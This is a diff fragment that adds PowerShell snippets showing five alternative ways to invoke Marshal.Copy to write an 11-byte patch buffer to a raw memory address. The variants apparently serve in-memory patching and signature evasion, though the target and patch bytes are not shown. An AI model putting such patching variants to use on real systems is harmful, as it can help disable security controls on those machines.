@@ -1,0 +1,18 @@
+# Using reflection to invoke Copy
+$new.GetMethod("Copy", [type[]]([byte[]], [int], [IntPtr], [int])).Invoke($null, @($Patch, 0, $Address, 11))
+
+# Splitting offset manually
+$ptr = [IntPtr]::Add($Address, 0)
+$new::Copy($Patch, 0, $ptr, 11)
+
+# Using a pinned GCHandle to feed Copy differently
+$handle = [System.Runtime.InteropServices.GCHandle]::Alloc($Patch, [System.Runtime.InteropServices.GCHandleType]::Pinned)
+$new::Copy($Patch, 0, $handle.AddrOfPinnedObject(), 11)
+$handle.Free()
+
+# Invoke via MethodInfo
+$method = [System.Runtime.InteropServices.Marshal].GetMethod("Copy", [type[]]([byte[]], [int], [IntPtr], [int]))
+$method.Invoke($null, ($Patch, 0, $Address, 11))
+
+# Casting address and calling
+$new::Copy([byte[]]$Patch, [int]0, [IntPtr]$Address, [int]11)
